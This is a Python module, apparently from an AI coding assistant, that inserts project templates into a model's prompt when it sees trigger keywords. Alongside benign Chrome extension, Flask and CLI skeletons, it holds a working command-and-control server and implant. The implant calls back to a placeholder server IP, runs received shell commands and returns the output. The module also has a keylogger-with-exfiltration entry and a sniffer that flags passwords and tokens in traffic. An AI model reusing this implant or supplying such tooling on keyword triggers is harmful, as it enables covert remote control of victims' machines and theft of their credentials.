"""
Atherix Red - Project Templates & Smart Context
Fixes core intelligence gaps:
1. Project templates for common project types (guaranteed working skeleton)
2. Smart search query generation (model crafts the query, not raw prompt)
3. Context budget management (inject only what's relevant)
4. Multi-file project awareness
"""

import re
import json

# ============================================================
# PROJECT TEMPLATES — working skeletons the model modifies
# ============================================================
TEMPLATES = {
    "chrome_extension": {
        "triggers": ["chrome extension", "browser extension", "manifest v3", "chrome plugin"],
        "description": "Chrome Extension (Manifest V3)",
        "files": {
            "manifest.json": """{
    "manifest_version": 3,
    "name": "{{NAME}}",
    "version": "1.0",
    "description": "{{DESCRIPTION}}",
    "permissions": ["storage", "activeTab"],
    "host_permissions": ["http://*/*", "https://*/*"],
    "background": {
        "service_worker": "bg.js"
    },
    "content_scripts": [{
        "matches": ["<all_urls>"],
        "js": ["content.js"]
    }],
    "action": {
        "default_popup": "popup.html",
        "default_icon": {
            "16": "icon16.png",
            "48": "icon48.png",
            "128": "icon128.png"
        }
    },
    "icons": {
        "16": "icon16.png",
        "48": "icon48.png",
        "128": "icon128.png"
    }
}""",
            "bg.js": """// Service Worker — NO document, NO window, NO localStorage
// Use chrome.storage.local for data, chrome.alarms for timers
// Use chrome.runtime.sendMessage for communication

chrome.runtime.onInstalled.addListener((details) => {
    console.log("Extension installed:", details.reason);
    chrome.storage.local.set({ initialized: true });
});

// Handle messages from content scripts and popup
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    console.log("Message received:", message);
    
    if (message.type === "getData") {
        chrome.storage.local.get([message.key], (result) => {
            sendResponse({ data: result[message.key] });
        });
        return true; // Required for async sendResponse
    }
    
    if (message.type === "setData") {
        chrome.storage.local.set({ [message.key]: message.value }, () => {
            sendResponse({ status: "saved" });
        });
        return true;
    }
    
    // {{BACKGROUND_LOGIC}}
});

// Optional: periodic task using alarms (replaces setInterval)
// chrome.alarms.create("periodicTask", { periodInMinutes: 1 });
// chrome.alarms.onAlarm.addListener((alarm) => {
//     if (alarm.name === "periodicTask") {
//         // Do periodic work here
//     }
// });
""",
            "content.js": """// Content Script — runs in web page context
// CAN access document, DOM, window
// Communicates with bg.js via chrome.runtime.sendMessage

(function() {
    "use strict";
    
    // {{CONTENT_LOGIC}}
    
    // Example: send data to service worker
    // chrome.runtime.sendMessage(
    //     { type: "getData", key: "myKey" },
    //     (response) => { console.log("Got:", response); }
    // );
    
    // Example: listen for messages from service worker
    // chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    //     if (message.type === "doSomething") {
    //         const result = document.querySelector(message.selector);
    //         sendResponse({ found: !!result });
    //     }
    // });
})();
""",
            "popup.html": """<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <style>
        body { width: 320px; padding: 16px; font-family: system-ui, sans-serif; }
        h2 { margin: 0 0 12px; font-size: 16px; }
        button { padding: 8px 16px; border: none; border-radius: 6px; 
                 background: #4CAF50; color: white; cursor: pointer; font-size: 14px; }
        button:hover { background: #45a049; }
        #status { margin-top: 12px; padding: 8px; background: #f0f0f0; border-radius: 4px; font-size: 13px; }
    </style>
</head>
<body>
    <h2>{{NAME}}</h2>
    <!-- {{POPUP_HTML}} -->
    <button id="actionBtn">Run Action</button>
    <div id="status">Ready</div>
    <script src="popup.js"></script>
</body>
</html>""",
            "popup.js": """// Popup Script — CAN access document (popup has its own DOM)
// Communicates with bg.js via chrome.runtime.sendMessage

document.addEventListener("DOMContentLoaded", () => {
    const statusEl = document.getElementById("status");
    const actionBtn = document.getElementById("actionBtn");
    
    actionBtn.addEventListener("click", () => {
        statusEl.textContent = "Running...";
        chrome.runtime.sendMessage({ type: "getData", key: "initialized" }, (response) => {
            statusEl.textContent = response?.data ? "Extension is active" : "Not initialized";
        });
    });
    
    // {{POPUP_LOGIC}}
});
"""
        },
        "instructions": """This is a Manifest V3 Chrome extension template. Modify the template files to add your functionality:

1. manifest.json — update name, description, add any extra permissions you need
2. bg.js — add your background logic where it says {{BACKGROUND_LOGIC}}
3. content.js — add your page manipulation where it says {{CONTENT_LOGIC}}
4. popup.html/popup.js — customize the popup UI and actions

REMEMBER:
- bg.js is a SERVICE WORKER: no document, no window, no localStorage
- content.js runs IN the web page: full DOM access
- popup.js runs in the popup: its own DOM, not the page's
- Use chrome.runtime.sendMessage to communicate between them
- Use chrome.storage.local for persistent data"""
    },

    "python_tool": {
        "triggers": ["python script", "python tool", "python program", "write a python"],
        "description": "Python CLI Tool",
        "files": {
            "{{NAME}}.py": """#!/usr/bin/env python3
\"\"\"
{{DESCRIPTION}}
\"\"\"

import argparse
import sys

def main():
    parser = argparse.ArgumentParser(description="{{DESCRIPTION}}")
    # {{ARGS}}
    args = parser.parse_args()
    
    # {{MAIN_LOGIC}}
    print("Done.")

if __name__ == "__main__":
    main()
"""
        },
        "instructions": "Single-file Python tool with argument parsing. Add your logic where marked."
    },

    "flask_api": {
        "triggers": ["flask app", "flask api", "flask server", "web api python", "rest api python"],
        "description": "Flask REST API",
        "files": {
            "app.py": """from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route("/")
def home():
    return jsonify({"status": "running", "message": "API is live"})

# {{ROUTES}}

if __name__ == "__main__":
    app.run(port=5000, debug=True)
""",
            "requirements.txt": """flask
flask-cors
"""
        },
        "instructions": "Flask API with CORS. Install: pip install -r requirements.txt. Run: python app.py"
    },

    "c2_framework": {
        "triggers": ["c2 server", "c2 framework", "command and control", "c2 client", "implant", "beacon"],
        "description": "C2 Framework (Server + Client)",
        "files": {
            "server.py": """#!/usr/bin/env python3
\"\"\"C2 Server — listens for connections from implants\"\"\"
import http.server
import json
import threading
import sys

PORT = {{PORT}}
commands = {}  # agent_id -> pending command
results = {}   # agent_id -> last result

class C2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args): pass  # Suppress logs
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length).decode()) if length > 0 else {}
        
        if self.path == "/register":
            agent_id = body.get("id", "unknown")
            print(f"[+] Agent registered: {agent_id}")
            self.send_json({"status": "registered"})
        
        elif self.path == "/checkin":
            agent_id = body.get("id", "unknown")
            # Return pending command if any
            cmd = commands.pop(agent_id, None)
            self.send_json({"command": cmd})
        
        elif self.path == "/result":
            agent_id = body.get("id", "unknown")
            results[agent_id] = body.get("output", "")
            print(f"[*] Result from {agent_id}: {results[agent_id][:200]}")
            self.send_json({"status": "received"})
        
        else:
            self.send_json({"error": "unknown endpoint"})
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

def console():
    while True:
        try:
            inp = input("c2> ").strip()
            if not inp: continue
            parts = inp.split(" ", 1)
            if parts[0] == "cmd" and len(parts) > 1:
                # Format: cmd <agent_id> <command>
                sub = parts[1].split(" ", 1)
                if len(sub) == 2:
                    commands[sub[0]] = sub[1]
                    print(f"[*] Command queued for {sub[0]}")
            elif parts[0] == "agents":
                print(f"Known results: {list(results.keys())}")
            elif parts[0] == "exit":
                sys.exit(0)
            else:
                print("Usage: cmd <agent_id> <command> | agents | exit")
        except (EOFError, KeyboardInterrupt):
            break

if __name__ == "__main__":
    print(f"[*] C2 Server starting on port {PORT}")
    server = http.server.HTTPServer(("0.0.0.0", PORT), C2Handler)
    threading.Thread(target=console, daemon=True).start()
    server.serve_forever()
""",
            "client.py": """#!/usr/bin/env python3
\"\"\"C2 Client/Implant — connects back to the C2 server\"\"\"
import requests
import subprocess
import time
import uuid
import os

C2_URL = "http://{{SERVER_IP}}:{{PORT}}"
AGENT_ID = str(uuid.uuid4())[:8]
CHECKIN_INTERVAL = {{INTERVAL}}  # seconds

def checkin():
    try:
        r = requests.post(f"{C2_URL}/checkin", json={"id": AGENT_ID}, timeout=10)
        data = r.json()
        return data.get("command")
    except:
        return None

def run_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
        return result.decode("utf-8", errors="replace")
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8", errors="replace")
    except Exception as e:
        return str(e)

def send_result(output):
    try:
        requests.post(f"{C2_URL}/result", json={"id": AGENT_ID, "output": output}, timeout=10)
    except:
        pass

def main():
    # Register
    try:
        requests.post(f"{C2_URL}/register", json={"id": AGENT_ID, "hostname": os.environ.get("COMPUTERNAME", "unknown")}, timeout=10)
    except:
        pass
    
    # Main loop
    while True:
        cmd = checkin()
        if cmd:
            output = run_command(cmd)
            send_result(output)
        time.sleep(CHECKIN_INTERVAL)

if __name__ == "__main__":
    main()
"""
        },
        "instructions": "C2 framework with HTTP-based server and client. Run server.py first, then client.py on target."
    },

    "port_scanner": {
        "triggers": ["port scanner", "scan ports", "port scan tool"],
        "description": "Multi-threaded Port Scanner",
        "files": {
            "scanner.py": """#!/usr/bin/env python3
\"\"\"Multi-threaded port scanner with banner grabbing\"\"\"
import socket
import threading
import sys
from queue import Queue

class PortScanner:
    def __init__(self, target, ports="1-1024", threads=100, timeout=2):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.open_ports = []
        self.lock = threading.Lock()
        self.queue = Queue()
        
        # Parse port range
        if "-" in ports:
            start, end = ports.split("-")
            self.ports = range(int(start), int(end) + 1)
        elif "," in ports:
            self.ports = [int(p) for p in ports.split(",")]
        else:
            self.ports = [int(ports)]
    
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                banner = ""
                try:
                    sock.send(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
                    banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
                except:
                    pass
                with self.lock:
                    self.open_ports.append({"port": port, "banner": banner[:200]})
                    print(f"  [+] Port {port} OPEN" + (f" — {banner[:80]}" if banner else ""))
            sock.close()
        except:
            pass
    
    def worker(self):
        while not self.queue.empty():
            port = self.queue.get()
            self.scan_port(port)
            self.queue.task_done()
    
    def run(self):
        print(f"Scanning {self.target} ({len(list(self.ports))} ports, {self.threads} threads)")
        for port in self.ports:
            self.queue.put(port)
        
        threads = []
        for _ in range(min(self.threads, self.queue.qsize())):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        self.queue.join()
        print(f"\\nDone. {len(self.open_ports)} open ports found.")
        return self.open_ports

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Port Scanner")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("-p", "--ports", default="1-1024", help="Port range (default: 1-1024)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Thread count (default: 100)")
    parser.add_argument("--timeout", type=float, default=2, help="Timeout in seconds (default: 2)")
    args = parser.parse_args()
    
    scanner = PortScanner(args.target, args.ports, args.threads, args.timeout)
    scanner.run()
"""
        },
        "instructions": "Usage: python scanner.py <target> -p 1-65535 -t 200"
    },

    "keylogger": {
        "triggers": ["keylogger", "keystroke", "key logger", "keyboard capture"],
        "description": "Keylogger with Exfiltration",
        "files": {},
        "instructions": "Keylogger template — model generates based on target OS and exfil method"
    },

    "network_sniffer": {
        "triggers": ["sniffer", "packet capture", "packet sniffer", "network monitor"],
        "description": "Network Packet Sniffer",
        "files": {
            "sniffer.py": """#!/usr/bin/env python3
\"\"\"Network packet sniffer using scapy\"\"\"
# pip install scapy
from scapy.all import sniff, IP, TCP, UDP, DNS, Raw
import argparse
from datetime import datetime

def packet_handler(packet):
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    if IP in packet:
        src = packet[IP].src
        dst = packet[IP].dst
        proto = packet[IP].proto
        
        if TCP in packet:
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flags = packet[TCP].flags
            print(f"[{timestamp}] TCP {src}:{sport} → {dst}:{dport} [{flags}]")
            
            if Raw in packet:
                data = packet[Raw].load
                try:
                    text = data.decode("utf-8", errors="ignore")
                    if any(keyword in text.lower() for keyword in ["password", "user", "login", "token", "cookie"]):
                        print(f"  ⚠ INTERESTING: {text[:200]}")
                except:
                    pass
        
        elif UDP in packet:
            if DNS in packet and packet[DNS].qr == 0:
                name = packet[DNS].qd.qname.decode() if packet[DNS].qd else "?"
                print(f"[{timestamp}] DNS Query: {name}")
        
        elif proto == 1:  # ICMP
            print(f"[{timestamp}] ICMP {src} → {dst}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Packet Sniffer")
    parser.add_argument("-i", "--interface", default=None, help="Network interface")
    parser.add_argument("-c", "--count", type=int, default=0, help="Packet count (0=unlimited)")
    parser.add_argument("-f", "--filter", default="", help="BPF filter (e.g. 'tcp port 80')")
    args = parser.parse_args()
    
    print(f"Starting sniffer" + (f" on {args.interface}" if args.interface else "") + "...")
    print("Press Ctrl+C to stop\\n")
    
    sniff(iface=args.interface, prn=packet_handler, count=args.count, 
          filter=args.filter, store=False)
"""
        },
        "instructions": "Requires: pip install scapy. Run as admin. Usage: python sniffer.py -f 'tcp port 80'"
    }
}

# ============================================================
# TEMPLATE MATCHING
# ============================================================
def detect_project_type(prompt):
    """Detect if the prompt matches a known project template."""
    prompt_lower = prompt.lower()
    for tpl_name, tpl in TEMPLATES.items():
        for trigger in tpl["triggers"]:
            if trigger in prompt_lower:
                return tpl_name
    return None

def get_template(project_type):
    """Get the template for a project type."""
    return TEMPLATES.get(project_type)

def format_template_for_prompt(project_type, user_prompt):
    """Format a template into a string the model can use as a starting point."""
    tpl = TEMPLATES.get(project_type)
    if not tpl:
        return ""
    
    parts = [f"PROJECT TEMPLATE: {tpl['description']}"]
    parts.append(f"Instructions: {tpl['instructions']}")
    parts.append("\nSTARTING FILES (modify these to fulfill the user's request):\n")
    
    for filename, content in tpl["files"].items():
        parts.append(f"**{filename}**")
        parts.append(f"```\n{content}\n```\n")
    
    parts.append("IMPORTANT: Use these templates as your starting point. Modify the {{PLACEHOLDER}} sections to add the user's requested functionality. Keep the overall structure intact — it's tested and working. Output ALL files with their filenames labeled.")
    
    return "\n".join(parts)

# ============================================================
# SMART SEARCH QUERY GENERATION
# ============================================================
def generate_search_queries(prompt):
    """Generate focused search queries from a user prompt.
    Returns list of query strings optimized for web search."""
    prompt_lower = prompt.lower()
    queries = []
    
    # Extract key technical terms
    tech_terms = re.findall(r'\b(?:chrome|extension|manifest|flask|react|python|javascript|node|nmap|'
                           r'metasploit|burp|sqlmap|socket|http|api|websocket|docker|nginx|'
                           r'sql|xss|csrf|ssrf|lfi|rfi|rce|xxe|idor|jwt|oauth|'
                           r'service.worker|content.script|background|popup|'
                           r'async|await|promise|callback|fetch|axios|'
                           r'import|require|module|package|library|framework|'
                           r'error|exception|bug|fix|crash|undefined|null|'
                           r'scan|enum|exploit|payload|shell|reverse|bind|'
                           r'privilege|escalat|lateral|persist|exfiltrat)\b', prompt_lower)
    
    if not tech_terms:
        return [prompt[:100]]
    
    # Deduplicate and limit
    seen = set()
    unique_terms = []
    for t in tech_terms:
        if t not in seen:
            seen.add(t)
            unique_terms.append(t)
    
    # Build focused queries
    primary_terms = " ".join(unique_terms[:5])
    queries.append(f"{primary_terms} tutorial example 2024")
    
    # If error-related, search for the fix
    error_match = re.search(r'(?:error|exception|TypeError|ReferenceError).*?[:]\s*(.+?)(?:\n|$)', prompt, re.IGNORECASE)
    if error_match:
        queries.append(f"fix {error_match.group(1)[:80]}")
    
    # If asking "how to", search for that specifically
    how_match = re.search(r'how (?:to|do|can)\s+(.+?)(?:\?|$)', prompt_lower)
    if how_match:
        queries.append(f"{how_match.group(1)[:80]} example code")
    
    return queries[:3]

# ============================================================
# CONTEXT BUDGET MANAGEMENT
# ============================================================
def manage_context_budget(system_prompt, coding_rules, rag_context, few_shots, template_context, max_budget=8000):
    """
    Manage how much context gets injected into the prompt.
    Prioritizes: template > coding rules > RAG > few-shots
    Trims to stay within budget so the model has room to generate.
    """
    budget_remaining = max_budget
    final_parts = [system_prompt]
    budget_remaining -= len(system_prompt) // 4  # Rough token estimate
    
    # Priority 1: Template (most valuable — working code)
    if template_context:
        tpl_tokens = len(template_context) // 4
        if tpl_tokens < budget_remaining * 0.4:
            final_parts.append(template_context)
            budget_remaining -= tpl_tokens
    
    # Priority 2: Coding rules (context-specific constraints)
    if coding_rules:
        rules_tokens = len(coding_rules) // 4
        if rules_tokens < budget_remaining * 0.3:
            final_parts.append("\n\nCODING RULES:\n" + coding_rules)
            budget_remaining -= rules_tokens
        else:
            # Trim to fit
            trimmed = coding_rules[:budget_remaining * 2]
            final_parts.append("\n\nCODING RULES (trimmed):\n" + trimmed)
            budget_remaining -= len(trimmed) // 4
    
    # Priority 3: RAG knowledge
    if rag_context:
        rag_tokens = len(rag_context) // 4
        if rag_tokens < budget_remaining * 0.3:
            final_parts.append(rag_context)
            budget_remaining -= rag_tokens
        else:
            trimmed = rag_context[:budget_remaining * 2]
            final_parts.append(trimmed)
            budget_remaining -= len(trimmed) // 4
    
    # Priority 4: Few-shot examples (lowest priority — cut first)
    if few_shots and budget_remaining > 500:
        shots_tokens = len(few_shots) // 4
        if shots_tokens < budget_remaining:
            final_parts.append(few_shots)
        # Otherwise skip — budget is tight
    
    return "\n".join(final_parts)
